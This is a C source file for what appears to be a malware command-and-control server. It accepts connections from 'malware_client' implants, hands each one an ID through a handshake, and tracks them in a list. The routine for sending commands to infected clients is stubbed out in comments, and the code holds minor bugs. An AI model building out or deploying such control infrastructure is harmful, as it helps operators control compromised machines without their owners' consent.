#include "server.h"


void server_initialize_server(malware_server * server, int port, int max_connections) {
    
    if (0 == max_connections) {
        max_connections = DEFAULT_MAX_CONNECTIONS;
    }

    if (0 == port) {
        port = DEFAULT_CONNECTION_PORT;
    }


    int client_socket;
    int * listening_socket = &server->listening_socket;
    struct sockaddr_in s_address;
    s_address.sin_port = htons(port);
    s_address.sin_family = AF_INET;
    s_address.sin_addr.s_addr = INADDR_ANY;
    int address_len = sizeof(s_address);

    
    server->last_id = FIRST_ID;
    server->max_clients = max_connections;

    signal(SIGTSTP, server_shutdown);
    signal(SIGINT, server_shutdown);
    signal(SIGQUIT, server_shutdown);

    printf("Initializing server on port %d\n", port);

    *listening_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (-1 == *listening_socket) {
        printf("Error creating a socket. errno = %d\n", errno);
        exit(EXIT_FAILURE);
    }

    int bind_status = bind(*listening_socket, (struct sockaddr*) &s_address, address_len);
    if (-1 == bind_status) {
        printf("Error binding the address to the socket. errno = %d\n", errno);
        exit(EXIT_FAILURE);
    }

    int listen_status = listen(*listening_socket, server->max_clients);
    if (-1 == listen_status) {
        printf("Error trying to listen to fd. errno = %d\n", errno);
        return;
    }

    printf("Listening on port %d...\n", port);

    while (1) {
        client_socket = accept(*listening_socket, (struct sockaddr *) &s_address, (socklen_t*) &address_len);
        if (-1 == client_socket) {
            printf("Error accepting a connection. errno = %d\n", errno);
            return;
        }
        
        char * client_ip = inet_ntoa(s_address.sin_addr);
        int client_port = (int) ntohs(s_address.sin_port);

        printf("--------------------\n");
        printf("Client connected:\nip = %s\n", client_ip);
        printf("port = %d\n", client_port);
        printf("fd = %d\n", client_socket);
        printf("--------------------\n");

        pthread_t t;
        malware_client * new_client = server_add_client(server, client_socket, &t);
        if (NULL == new_client) {
            printf("You have reached maximum connections.\n");
            continue;
        }

        pthread_create(&t, NULL, new_client_handshake, (void *) new_client);
    }
}

void * new_client_handshake(void * client_to_handshake_ptr) {
    
    malware_client * client_to_handshake = (malware_client *) client_to_handshake_ptr;

    packet * packet_received_1 = connection_read_packet(&client_to_handshake->connection);

    if (PACKET_TYPE_NEED_ID != packet_received_1->packet_type) {
        printf("on 'new_client_handshake:' - wrong packet type received from client. type: %d\n", packet_received_1->packet_type);
        return NULL;
    }

    packet_content_id content = {
        client_to_handshake->id
    };

    packet packet_to_send = {
        .packet_type = PACKET_TYPE_ID,
        .content_size = sizeof(content),
        .content = &content
    };

    connection_send_packet(&client_to_handshake->connection, &packet_to_send);

    packet * packet_received_2 = connection_read_packet(&client_to_handshake->connection);

    if (PACKET_TYPE_ID_SUCCESS == packet_received_2->packet_type) {
        client_to_handshake->status = CLIENT_STATUS_READY;
        printf("Successfully added clinet. id = %d\n", client_to_handshake->id);
    }
    else {
        printf("on 'new_client_handshake:' - wrong packet type received from client. type: %d\n", packet_received_2->packet_type);
        return NULL;
    }
    return NULL;
}

malware_client * server_add_client(malware_server * server, int socket, pthread_t * t) {

    if (get_list_length(server->clients_lst) >= server->max_clients) {
        return NULL;
    }

    malware_client * new_client = malloc(sizeof(malware_client));
    new_client->id = server_generate_id(server);
    new_client->connection.socket = socket;
    new_client->thread = t;

    add_node(server->clients_lst, new_client);
    return new_client;
}

void server_remove_client(malware_server * server, int id) {
    malware_client * client = server_get_client_by_id(server, id);
    bzero(client, sizeof(malware_client));
}

malware_client * server_get_client_by_id(malware_server * server, int id) {

    node * head = server->clients_lst->head;
    while (NULL != head->next) {
        malware_client * mc = (malware_client*) head->value;
        if (id == mc->id) {
            return mc;
        }

        head = head->next;
    }
    return NULL;
}

int server_generate_id(malware_server * server) {
    return server->last_id++;
}

void server_execute_malware_command(malware_server * server, int client_id, COMMAND_TYPE cmd_type, int args_len, char args[]) {
    // malware_client * client = server_get_client_by_id(server, client_id);

    // packet_content_command pc_command = {
    //     .command_type = cmd_type,
    //     .args = args
    // };

    // packet packet_to_send = {
    //     .packet_type = PACKET_TYPE_COMMAND,
    //     .content = (void*) &pc_command
    // };

    // int size = sizeof(packet) + sizeof(pc_command) + (args_len * sizeof(char));

    // connection_send_packet(&client->connection, )
}

void server_shutdown() {
    printf("Shutting server down...\n");
    kill(getpid(), 9);
}